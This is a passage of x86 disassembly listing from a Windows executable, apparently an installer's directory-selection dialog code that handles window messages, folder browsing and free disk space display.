  404998:	ff 15 58 82 40 00    	call   *0x408258
  40499e:	c3                   	ret
  40499f:	55                   	push   %ebp
  4049a0:	8b ec                	mov    %esp,%ebp
  4049a2:	83 ec 3c             	sub    $0x3c,%esp
  4049a5:	8b 45 08             	mov    0x8(%ebp),%eax
  4049a8:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  4049ac:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  4049b0:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4049b3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4049b6:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  4049bd:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4049c0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4049c3:	50                   	push   %eax
  4049c4:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  4049cb:	c7 45 d0 8c a3 40 00 	movl   $0x40a38c,-0x30(%ebp)
  4049d2:	e8 01 12 00 00       	call   0x405bd8
  4049d7:	c9                   	leave
  4049d8:	c2 0c 00             	ret    $0xc
  4049db:	55                   	push   %ebp
  4049dc:	8b ec                	mov    %esp,%ebp
  4049de:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4049e5:	56                   	push   %esi
  4049e6:	8b 75 14             	mov    0x14(%ebp),%esi
  4049e9:	75 26                	jne    0x404a11
  4049eb:	ff 76 30             	push   0x30(%esi)
  4049ee:	6a 1d                	push   $0x1d
  4049f0:	ff 75 08             	push   0x8(%ebp)
  4049f3:	e8 39 fb ff ff       	call   0x404531
  4049f8:	8b 46 3c             	mov    0x3c(%esi),%eax
  4049fb:	c1 e0 0b             	shl    $0xb,%eax
  4049fe:	05 00 50 43 00       	add    $0x435000,%eax
  404a03:	50                   	push   %eax
  404a04:	68 e8 03 00 00       	push   $0x3e8
  404a09:	ff 75 08             	push   0x8(%ebp)
  404a0c:	e8 df 11 00 00       	call   0x405bf0
  404a11:	56                   	push   %esi
  404a12:	ff 75 10             	push   0x10(%ebp)
  404a15:	ff 75 0c             	push   0xc(%ebp)
  404a18:	e8 7b fb ff ff       	call   0x404598
  404a1d:	5e                   	pop    %esi
  404a1e:	5d                   	pop    %ebp
  404a1f:	c2 10 00             	ret    $0x10
  404a22:	55                   	push   %ebp
  404a23:	8b ec                	mov    %esp,%ebp
  404a25:	83 ec 4c             	sub    $0x4c,%esp
  404a28:	a1 40 ba 42 00       	mov    0x42ba40,%eax
  404a2d:	53                   	push   %ebx
  404a2e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404a31:	56                   	push   %esi
  404a32:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404a35:	8b 40 38             	mov    0x38(%eax),%eax
  404a38:	c1 e3 0b             	shl    $0xb,%ebx
  404a3b:	81 c3 00 50 43 00    	add    $0x435000,%ebx
  404a41:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404a48:	57                   	push   %edi
  404a49:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404a4c:	75 11                	jne    0x404a5f
  404a4e:	53                   	push   %ebx
  404a4f:	68 fb 03 00 00       	push   $0x3fb
  404a54:	e8 9d 11 00 00       	call   0x405bf6
  404a59:	53                   	push   %ebx
  404a5a:	e8 01 1e 00 00       	call   0x406860
  404a5f:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404a66:	8b 75 08             	mov    0x8(%ebp),%esi
  404a69:	75 6c                	jne    0x404ad7
  404a6b:	68 fb 03 00 00       	push   $0x3fb
  404a70:	56                   	push   %esi
  404a71:	ff 15 3c 82 40 00    	call   *0x40823c
  404a77:	53                   	push   %ebx
  404a78:	8b f8                	mov    %eax,%edi
  404a7a:	e8 79 14 00 00       	call   0x405ef8
  404a7f:	85 c0                	test   %eax,%eax
  404a81:	74 10                	je     0x404a93
  404a83:	53                   	push   %ebx
  404a84:	e8 a3 14 00 00       	call   0x405f2c
  404a89:	85 c0                	test   %eax,%eax
  404a8b:	75 06                	jne    0x404a93
  404a8d:	53                   	push   %ebx
  404a8e:	e8 ee 13 00 00       	call   0x405e81
  404a93:	53                   	push   %ebx
  404a94:	57                   	push   %edi
  404a95:	89 35 d8 36 43 00    	mov    %esi,0x4336d8
  404a9b:	ff 15 1c 82 40 00    	call   *0x40821c
  404aa1:	8b 45 14             	mov    0x14(%ebp),%eax
  404aa4:	ff 70 34             	push   0x34(%eax)
  404aa7:	6a 01                	push   $0x1
  404aa9:	56                   	push   %esi
  404aaa:	e8 82 fa ff ff       	call   0x404531
  404aaf:	8b 45 14             	mov    0x14(%ebp),%eax
  404ab2:	ff 70 30             	push   0x30(%eax)
  404ab5:	6a 14                	push   $0x14
  404ab7:	56                   	push   %esi
  404ab8:	e8 74 fa ff ff       	call   0x404531
  404abd:	57                   	push   %edi
  404abe:	e8 a3 fa ff ff       	call   0x404566
  404ac3:	6a 09                	push   $0x9
  404ac5:	e8 dc 1e 00 00       	call   0x4069a6
  404aca:	85 c0                	test   %eax,%eax
  404acc:	0f 84 91 02 00 00    	je     0x404d63
  404ad2:	6a 01                	push   $0x1
  404ad4:	57                   	push   %edi
  404ad5:	ff d0                	call   *%eax
  404ad7:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404ade:	0f 85 d1 00 00 00    	jne    0x404bb5
  404ae4:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404ae8:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404aed:	75 18                	jne    0x404b07
  404aef:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404af2:	c1 e9 10             	shr    $0x10,%ecx
  404af5:	66 81 f9 00 03       	cmp    $0x300,%cx
  404afa:	0f 85 63 02 00 00    	jne    0x404d63
  404b00:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404b07:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404b0c:	0f 85 a3 00 00 00    	jne    0x404bb5
  404b12:	6a 07                	push   $0x7
  404b14:	33 c0                	xor    %eax,%eax
  404b16:	59                   	pop    %ecx
  404b17:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404b1a:	ff 75 f8             	push   -0x8(%ebp)
  404b1d:	f3 ab                	rep stos %eax,%es:(%edi)
  404b1f:	bf 68 ca 42 00       	mov    $0x42ca68,%edi
  404b24:	68 40 b2 42 00       	push   $0x42b240
  404b29:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404b2c:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404b2f:	c7 45 c8 78 4d 40 00 	movl   $0x404d78,-0x38(%ebp)
  404b36:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404b39:	e8 b1 1a 00 00       	call   0x4065ef
  404b3e:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404b41:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404b44:	50                   	push   %eax
  404b45:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404b4c:	ff 15 78 81 40 00    	call   *0x408178
  404b52:	85 c0                	test   %eax,%eax
  404b54:	74 58                	je     0x404bae
  404b56:	50                   	push   %eax
  404b57:	ff 15 a0 82 40 00    	call   *0x4082a0
  404b5d:	53                   	push   %ebx
  404b5e:	e8 1e 13 00 00       	call   0x405e81
  404b63:	a1 10 47 43 00       	mov    0x434710,%eax
  404b68:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404b6e:	85 c0                	test   %eax,%eax
  404b70:	74 28                	je     0x404b9a
  404b72:	81 fb 00 f8 43 00    	cmp    $0x43f800,%ebx
  404b78:	75 20                	jne    0x404b9a
  404b7a:	50                   	push   %eax
  404b7b:	6a 00                	push   $0x0
  404b7d:	e8 6d 1a 00 00       	call   0x4065ef
  404b82:	57                   	push   %edi
  404b83:	bf a0 26 43 00       	mov    $0x4326a0,%edi
  404b88:	57                   	push   %edi
  404b89:	ff 15 00 81 40 00    	call   *0x408100
  404b8f:	85 c0                	test   %eax,%eax
  404b91:	74 07                	je     0x404b9a
  404b93:	57                   	push   %edi
  404b94:	53                   	push   %ebx
  404b95:	e8 34 1a 00 00       	call   0x4065ce
  404b9a:	ff 05 58 ca 42 00    	incl   0x42ca58
  404ba0:	53                   	push   %ebx
  404ba1:	68 fb 03 00 00       	push   $0x3fb
  404ba6:	56                   	push   %esi
  404ba7:	e8 44 10 00 00       	call   0x405bf0
  404bac:	eb 07                	jmp    0x404bb5
  404bae:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404bb5:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404bbc:	74 0d                	je     0x404bcb
  404bbe:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404bc5:	0f 85 98 01 00 00    	jne    0x404d63
  404bcb:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404bcf:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404bd3:	53                   	push   %ebx
  404bd4:	68 fb 03 00 00       	push   $0x3fb
  404bd9:	e8 18 10 00 00       	call   0x405bf6
  404bde:	53                   	push   %ebx
  404bdf:	e8 a5 13 00 00       	call   0x405f89
  404be4:	85 c0                	test   %eax,%eax
  404be6:	75 07                	jne    0x404bef
  404be8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404bef:	be 38 aa 42 00       	mov    $0x42aa38,%esi
  404bf4:	53                   	push   %ebx
  404bf5:	56                   	push   %esi
  404bf6:	e8 b7 19 00 00       	call   0x4065b2
  404bfb:	6a 01                	push   $0x1
  404bfd:	e8 a4 1d 00 00       	call   0x4069a6
  404c02:	85 c0                	test   %eax,%eax
  404c04:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404c07:	74 3a                	je     0x404c43
  404c09:	33 c0                	xor    %eax,%eax
  404c0b:	33 ff                	xor    %edi,%edi
  404c0d:	3b c6                	cmp    %esi,%eax
  404c0f:	74 32                	je     0x404c43
  404c11:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404c14:	50                   	push   %eax
  404c15:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404c18:	50                   	push   %eax
  404c19:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404c1c:	50                   	push   %eax
  404c1d:	56                   	push   %esi
  404c1e:	ff 55 f4             	call   *-0xc(%ebp)
  404c21:	85 c0                	test   %eax,%eax
  404c23:	75 76                	jne    0x404c9b
  404c25:	85 ff                	test   %edi,%edi
  404c27:	74 03                	je     0x404c2c
  404c29:	66 21 07             	and    %ax,(%edi)
  404c2c:	56                   	push   %esi
  404c2d:	e8 9b 12 00 00       	call   0x405ecd
  404c32:	8b f8                	mov    %eax,%edi
  404c34:	66 83 27 00          	andw   $0x0,(%edi)
  404c38:	4f                   	dec    %edi
  404c39:	4f                   	dec    %edi
  404c3a:	3b fe                	cmp    %esi,%edi
  404c3c:	66 c7 07 5c 00       	movw   $0x5c,(%edi)
  404c41:	75 ce                	jne    0x404c11
  404c43:	53                   	push   %ebx
  404c44:	56                   	push   %esi
  404c45:	e8 68 19 00 00       	call   0x4065b2
  404c4a:	56                   	push   %esi
  404c4b:	e8 dc 12 00 00       	call   0x405f2c
  404c50:	33 ff                	xor    %edi,%edi
  404c52:	3b c7                	cmp    %edi,%eax
  404c54:	74 03                	je     0x404c59
  404c56:	66 89 38             	mov    %di,(%eax)
  404c59:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404c5c:	50                   	push   %eax
  404c5d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404c60:	50                   	push   %eax
  404c61:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404c64:	50                   	push   %eax
  404c65:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c68:	50                   	push   %eax
  404c69:	56                   	push   %esi
  404c6a:	ff 15 90 80 40 00    	call   *0x408090
  404c70:	85 c0                	test   %eax,%eax
  404c72:	74 43                	je     0x404cb7
  404c74:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404c77:	be 00 04 00 00       	mov    $0x400,%esi
  404c7c:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404c80:	56                   	push   %esi
  404c81:	ff 75 f4             	push   -0xc(%ebp)
  404c84:	50                   	push   %eax
  404c85:	ff 15 48 81 40 00    	call   *0x408148
  404c8b:	99                   	cltd
  404c8c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404c8f:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404c92:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404c99:	eb 21                	jmp    0x404cbc
  404c9b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404c9e:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404ca1:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404ca5:	c1 e9 0a             	shr    $0xa,%ecx
  404ca8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404cab:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404cae:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404cb5:	33 ff                	xor    %edi,%edi
  404cb7:	be 00 04 00 00       	mov    $0x400,%esi
  404cbc:	6a 05                	push   $0x5
  404cbe:	e8 fc 01 00 00       	call   0x404ebf
  404cc3:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404cc6:	74 19                	je     0x404ce1
  404cc8:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404ccb:	33 c9                	xor    %ecx,%ecx
  404ccd:	3b d1                	cmp    %ecx,%edx
  404ccf:	77 10                	ja     0x404ce1
  404cd1:	72 07                	jb     0x404cda
  404cd3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404cd6:	3b c8                	cmp    %eax,%ecx
  404cd8:	73 07                	jae    0x404ce1
  404cda:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404ce1:	8b 0d dc 36 43 00    	mov    0x4336dc,%ecx
  404ce7:	39 79 10             	cmp    %edi,0x10(%ecx)
  404cea:	74 30                	je     0x404d1c
  404cec:	50                   	push   %eax
  404ced:	6a fb                	push   $0xfffffffb
  404cef:	68 ff 03 00 00       	push   $0x3ff
  404cf4:	e8 ae 01 00 00       	call   0x404ea7
  404cf9:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404cfc:	74 10                	je     0x404d0e
  404cfe:	ff 75 d8             	push   -0x28(%ebp)
  404d01:	ff 75 d4             	push   -0x2c(%ebp)
  404d04:	6a fc                	push   $0xfffffffc
  404d06:	56                   	push   %esi
  404d07:	e8 d2 00 00 00       	call   0x404dde
  404d0c:	eb 0e                	jmp    0x404d1c
  404d0e:	68 28 aa 42 00       	push   $0x42aa28
  404d13:	56                   	push   %esi
  404d14:	ff 75 08             	push   0x8(%ebp)
  404d17:	e8 d4 0e 00 00       	call   0x405bf0
  404d1c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404d1f:	3b c7                	cmp    %edi,%eax
  404d21:	a3 a4 47 43 00       	mov    %eax,0x4347a4
  404d26:	75 0a                	jne    0x404d32
  404d28:	6a 07                	push   $0x7
  404d2a:	e8 dc c6 ff ff       	call   0x40140b
  404d2f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404d32:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404d35:	85 70 14             	test   %esi,0x14(%eax)
  404d38:	74 03                	je     0x404d3d
  404d3a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404d3d:	33 c0                	xor    %eax,%eax
  404d3f:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404d42:	0f 94 c0             	sete   %al
  404d45:	50                   	push   %eax
  404d46:	e8 08 f8 ff ff       	call   0x404553
  404d4b:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404d4e:	75 0d                	jne    0x404d5d
  404d50:	39 3d 58 ca 42 00    	cmp    %edi,0x42ca58
  404d56:	75 05                	jne    0x404d5d
  404d58:	e8 1e fc ff ff       	call   0x40497b
  404d5d:	89 3d 58 ca 42 00    	mov    %edi,0x42ca58
  404d63:	ff 75 14             	push   0x14(%ebp)
  404d66:	ff 75 10             	push   0x10(%ebp)
  404d69:	ff 75 0c             	push   0xc(%ebp)
  404d6c:	e8 27 f8 ff ff       	call   0x404598
  404d71:	5f                   	pop    %edi
  404d72:	5e                   	pop    %esi
  404d73:	5b                   	pop    %ebx
  404d74:	c9                   	leave
  404d75:	c2 10 00             	ret    $0x10
  404d78:	55                   	push   %ebp
  404d79:	8b ec                	mov    %esp,%ebp
  404d7b:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404d7f:	56                   	push   %esi
  404d80:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404d86:	75 1c                	jne    0x404da4
  404d88:	ff 75 14             	push   0x14(%ebp)
  404d8b:	68 fb 03 00 00       	push   $0x3fb
  404d90:	e8 61 0e 00 00       	call   0x405bf6
  404d95:	ff 75 14             	push   0x14(%ebp)
  404d98:	6a 01                	push   $0x1
  404d9a:	68 67 04 00 00       	push   $0x467
  404d9f:	ff 75 08             	push   0x8(%ebp)
  404da2:	ff d6                	call   *%esi
  404da4:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404da8:	75 2d                	jne    0x404dd7
  404daa:	ff 75 14             	push   0x14(%ebp)
  404dad:	ff 75 10             	push   0x10(%ebp)
  404db0:	ff 15 74 81 40 00    	call   *0x408174
  404db6:	85 c0                	test   %eax,%eax
  404db8:	74 0e                	je     0x404dc8
  404dba:	6a 07                	push   $0x7
  404dbc:	e8 4a c6 ff ff       	call   0x40140b
  404dc1:	85 c0                	test   %eax,%eax
  404dc3:	75 03                	jne    0x404dc8
  404dc5:	40                   	inc    %eax
  404dc6:	eb 02                	jmp    0x404dca
  404dc8:	33 c0                	xor    %eax,%eax
  404dca:	50                   	push   %eax
  404dcb:	6a 00                	push   $0x0
  404dcd:	68 65 04 00 00       	push   $0x465
  404dd2:	ff 75 08             	push   0x8(%ebp)
  404dd5:	ff d6                	call   *%esi
  404dd7:	33 c0                	xor    %eax,%eax
  404dd9:	5e                   	pop    %esi
  404dda:	5d                   	pop    %ebp
  404ddb:	c2 10 00             	ret    $0x10
  404dde:	55                   	push   %ebp
  404ddf:	8b ec                	mov    %esp,%ebp
  404de1:	81 ec 80 00 00 00    	sub    $0x80,%esp
  404de7:	8b 45 14             	mov    0x14(%ebp),%eax
  404dea:	53                   	push   %ebx
  404deb:	56                   	push   %esi
  404dec:	8b 75 10             	mov    0x10(%ebp),%esi
  404def:	57                   	push   %edi
  404df0:	6a dc                	push   $0xffffffdc
  404df2:	85 c0                	test   %eax,%eax
  404df4:	5b                   	pop    %ebx
  404df5:	74 0b                	je     0x404e02
  404df7:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404dfb:	c1 e8 14             	shr    $0x14,%eax
  404dfe:	33 ff                	xor    %edi,%edi
  404e00:	eb 4e                	jmp    0x404e50
  404e02:	6a 14                	push   $0x14
  404e04:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404e0a:	59                   	pop    %ecx
  404e0b:	8b c6                	mov    %esi,%eax
  404e0d:	73 06                	jae    0x404e15
  404e0f:	6a 0a                	push   $0xa
  404e11:	59                   	pop    %ecx
  404e12:	6a dd                	push   $0xffffffdd
  404e14:	5b                   	pop    %ebx
  404e15:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404e1b:	73 05                	jae    0x404e22
  404e1d:	6a de                	push   $0xffffffde
  404e1f:	33 c9                	xor    %ecx,%ecx
  404e21:	5b                   	pop    %ebx
  404e22:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404e28:	73 0d                	jae    0x404e37
  404e2a:	33 c0                	xor    %eax,%eax
  404e2c:	6a 14                	push   $0x14
  404e2e:	40                   	inc    %eax
  404e2f:	5f                   	pop    %edi
  404e30:	d3 e0                	shl    %cl,%eax
  404e32:	99                   	cltd
  404e33:	f7 ff                	idiv   %edi
  404e35:	03 c6                	add    %esi,%eax
  404e37:	8b f0                	mov    %eax,%esi
  404e39:	25 ff ff ff 00       	and    $0xffffff,%eax
  404e3e:	6a 0a                	push   $0xa
  404e40:	33 d2                	xor    %edx,%edx
  404e42:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404e45:	03 c0                	add    %eax,%eax
  404e47:	d3 e8                	shr    %cl,%eax
  404e49:	d3 ee                	shr    %cl,%esi
  404e4b:	59                   	pop    %ecx
  404e4c:	f7 f1                	div    %ecx
  404e4e:	8b fa                	mov    %edx,%edi
  404e50:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404e53:	6a df                	push   $0xffffffdf
  404e55:	50                   	push   %eax
  404e56:	e8 94 17 00 00       	call   0x4065ef
  404e5b:	50                   	push   %eax
  404e5c:	8d 45 80             	lea    -0x80(%ebp),%eax
  404e5f:	53                   	push   %ebx
  404e60:	50                   	push   %eax
  404e61:	e8 89 17 00 00       	call   0x4065ef
  404e66:	50                   	push   %eax
  404e67:	57                   	push   %edi
  404e68:	56                   	push   %esi
  404e69:	68 98 a3 40 00       	push   $0x40a398
  404e6e:	ff 75 0c             	push   0xc(%ebp)
  404e71:	be 68 ca 42 00       	mov    $0x42ca68,%esi
  404e76:	56                   	push   %esi
  404e77:	e8 73 17 00 00       	call   0x4065ef
  404e7c:	56                   	push   %esi
  404e7d:	8b f8                	mov    %eax,%edi
  404e7f:	e8 44 17 00 00       	call   0x4065c8
  404e84:	8d 04 47             	lea    (%edi,%eax,2),%eax
  404e87:	50                   	push   %eax
  404e88:	ff 15 2c 82 40 00    	call   *0x40822c
  404e8e:	83 c4 18             	add    $0x18,%esp
  404e91:	56                   	push   %esi
  404e92:	ff 75 08             	push   0x8(%ebp)
  404e95:	ff 35 d8 36 43 00    	push   0x4336d8
  404e9b:	e8 50 0d 00 00       	call   0x405bf0
  404ea0:	5f                   	pop    %edi
  404ea1:	5e                   	pop    %esi
  404ea2:	5b                   	pop    %ebx
  404ea3:	c9                   	leave
  404ea4:	c2 10 00             	ret    $0x10
  404ea7:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404eab:	33 c9                	xor    %ecx,%ecx
  404ead:	51                   	push   %ecx
  404eae:	50                   	push   %eax
  404eaf:	ff 74 24 10          	push   0x10(%esp)
  404eb3:	ff 74 24 10          	push   0x10(%esp)
  404eb7:	e8 22 ff ff ff       	call   0x404dde
  404ebc:	c2 0c 00             	ret    $0xc
  404ebf:	8b 15 2c 47 43 00    	mov    0x43472c,%edx
  404ec5:	8b 0d 28 47 43 00    	mov    0x434728,%ecx
  404ecb:	33 c0                	xor    %eax,%eax
  404ecd:	85 d2                	test   %edx,%edx
  404ecf:	74 18                	je     0x404ee9
  404ed1:	56                   	push   %esi
  404ed2:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404ed6:	74 07                	je     0x404edf
  404ed8:	8b 74 24 08          	mov    0x8(%esp),%esi
  404edc:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404edf:	81 c1 18 08 00 00    	add    $0x818,%ecx
  404ee5:	4a                   	dec    %edx
  404ee6:	75 ea                	jne    0x404ed2
  404ee8:	5e                   	pop    %esi
  404ee9:	c2 04 00             	ret    $0x4
  404eec:	55                   	push   %ebp
  404eed:	8b ec                	mov    %esp,%ebp
  404eef:	83 ec 38             	sub    $0x38,%esp
  404ef2:	56                   	push   %esi
  404ef3:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404ef9:	57                   	push   %edi
  404efa:	8b 7d 08             	mov    0x8(%ebp),%edi
  404efd:	6a 00                	push   $0x0
  404eff:	6a 09                	push   $0x9
  404f01:	68 0a 11 00 00       	push   $0x110a
  404f06:	57                   	push   %edi
  404f07:	ff d6                	call   *%esi
  404f09:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404f0d:	74 3c                	je     0x404f4b
  404f0f:	ff 15 bc 81 40 00    	call   *0x4081bc
  404f15:	0f bf c8             	movswl %ax,%ecx
  404f18:	c1 e8 10             	shr    $0x10,%eax
  404f1b:	0f bf c0             	movswl %ax,%eax
  404f1e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404f21:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404f24:	50                   	push   %eax
  404f25:	57                   	push   %edi
  404f26:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404f29:	ff 15 ec 81 40 00    	call   *0x4081ec
  404f2f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404f32:	50                   	push   %eax
  404f33:	6a 00                	push   $0x0
  404f35:	68 11 11 00 00       	push   $0x1111
  404f3a:	57                   	push   %edi
  404f3b:	ff d6                	call   *%esi
  404f3d:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404f41:	75 05                	jne    0x404f48
  404f43:	83 c8 ff             	or     $0xffffffff,%eax
  404f46:	eb 1e                	jmp    0x404f66
  404f48:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f4b:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404f4e:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404f51:	50                   	push   %eax
  404f52:	6a 00                	push   $0x0
  404f54:	68 3e 11 00 00       	push   $0x113e
  404f59:	57                   	push   %edi
  404f5a:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404f61:	ff d6                	call   *%esi
  404f63:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404f66:	5f                   	pop    %edi
  404f67:	5e                   	pop    %esi
  404f68:	c9                   	leave
  404f69:	c2 08 00             	ret    $0x8
  404f6c:	56                   	push   %esi
  404f6d:	57                   	push   %edi
  404f6e:	be 00 50 43 00       	mov    $0x435000,%esi
  404f73:	bf 68 ca 42 00       	mov    $0x42ca68,%edi
  404f78:	56                   	push   %esi
  404f79:	57                   	push   %edi
  404f7a:	e8 33 16 00 00       	call   0x4065b2
  404f7f:	ff 74 24 10          	push   0x10(%esp)
  404f83:	56                   	push   %esi
  404f84:	e8 70 15 00 00       	call   0x4064f9
  404f89:	ff 74 24 0c          	push   0xc(%esp)
  404f8d:	e8 79 c4 ff ff       	call   0x40140b
  404f92:	57                   	push   %edi
  404f93:	56                   	push   %esi
  404f94:	e8 19 16 00 00       	call   0x4065b2
  404f99:	5f                   	pop    %edi
  404f9a:	5e                   	pop    %esi
  404f9b:	c2 08 00             	ret    $0x8
  404f9e:	55                   	push   %ebp
  404f9f:	8b ec                	mov    %esp,%ebp
  404fa1:	83 ec 54             	sub    $0x54,%esp
  404fa4:	53                   	push   %ebx
  404fa5:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404fa8:	56                   	push   %esi
  404fa9:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  404faf:	57                   	push   %edi
  404fb0:	68 f9 03 00 00       	push   $0x3f9
  404fb5:	53                   	push   %ebx
  404fb6:	ff d6                	call   *%esi
  404fb8:	68 08 04 00 00       	push   $0x408
  404fbd:	53                   	push   %ebx
  404fbe:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404fc1:	ff d6                	call   *%esi
  404fc3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404fc6:	a1 28 47 43 00       	mov    0x434728,%eax
  404fcb:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404fd1:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404fd4:	a1 10 47 43 00       	mov    0x434710,%eax
  404fd9:	33 ff                	xor    %edi,%edi
  404fdb:	05 94 00 00 00       	add    $0x94,%eax
  404fe0:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404fe7:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404fea:	0f 85 25 02 00 00    	jne    0x405215
  404ff0:	a1 2c 47 43 00       	mov    0x43472c,%eax
  404ff5:	89 7d e0             	mov    %edi,-0x20(%ebp)
  404ff8:	c1 e0 02             	shl    $0x2,%eax
  404ffb:	50                   	push   %eax
  404ffc:	6a 40                	push   $0x40
  404ffe:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  405005:	89 1d 60 47 43 00    	mov    %ebx,0x434760
  40500b:	ff 15 10 81 40 00    	call   *0x408110
  405011:	57                   	push   %edi
  405012:	57                   	push   %edi
  405013:	57                   	push   %edi
  405014:	57                   	push   %edi
  405015:	6a 6e                	push   $0x6e
  405017:	a3 60 ca 42 00       	mov    %eax,0x42ca60
  40501c:	ff 35 00 47 43 00    	push   0x434700
  405022:	ff 15 44 82 40 00    	call   *0x408244
  405028:	83 0d 54 ca 42 00 ff 	orl    $0xffffffff,0x42ca54
  40502f:	68 ab 55 40 00       	push   $0x4055ab
  405034:	6a fc                	push   $0xfffffffc
  405036:	8b d8                	mov    %eax,%ebx
  405038:	ff 75 fc             	push   -0x4(%ebp)
  40503b:	ff 15 40 82 40 00    	call   *0x408240
  405041:	57                   	push   %edi
  405042:	6a 06                	push   $0x6
  405044:	6a 21                	push   $0x21
  405046:	6a 10                	push   $0x10
  405048:	6a 10                	push   $0x10
  40504a:	a3 5c ca 42 00       	mov    %eax,0x42ca5c
  40504f:	ff 15 40 80 40 00    	call   *0x408040
  405055:	68 ff 00 ff 00       	push   $0xff00ff
  40505a:	53                   	push   %ebx
  40505b:	50                   	push   %eax
  40505c:	a3 4c ca 42 00       	mov    %eax,0x42ca4c
  405061:	ff 15 3c 80 40 00    	call   *0x40803c
  405067:	ff 35 4c ca 42 00    	push   0x42ca4c
  40506d:	6a 02                	push   $0x2
  40506f:	68 09 11 00 00       	push   $0x1109
  405074:	ff 75 fc             	push   -0x4(%ebp)
  405077:	ff d6                	call   *%esi
  405079:	57                   	push   %edi
  40507a:	57                   	push   %edi
